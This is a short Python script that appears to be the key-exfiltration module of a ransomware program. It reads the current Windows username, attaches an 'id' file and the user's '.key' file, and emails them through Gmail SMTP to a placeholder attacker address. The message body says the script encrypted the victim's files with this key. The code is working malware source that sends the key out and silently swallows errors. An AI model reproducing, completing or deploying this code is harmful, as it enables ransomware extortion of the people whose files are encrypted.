#!/usr/bin/env python
#coding:utf-8
import smtplib, os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# GET THE ENVIRONMENT VARIABLES
current_user = os.environ["USERNAME"]

# SET DESTINATOR AND THE SENDER
fromaddr = "FROM_TO@gmail.com"
toaddr = "DEST_TO@gmail.com"

# PREPARE MULTIPLE ATTACHMENT
attachment = ["id", "{}.key".format(current_user)]

# FUNCTION TO PREPARE THE MAIL
def send_key():
    try:
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Client Key and ID"
        body = "The server you sending a key from the client, the script encrypted her files with this key."
        msg.attach(MIMEText(body, 'plain'))
        # FOR MULTIPLE ATTACHMENT
        for filename in attachment:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(open(filename, "rb").read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= {}".format(filename))
            msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, "YOUR_PASS_HERE")
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
    except IOError:
        pass
    except smtplib.SMTPAuthenticationError:
        print("[!] Login or pass failed")
        pass
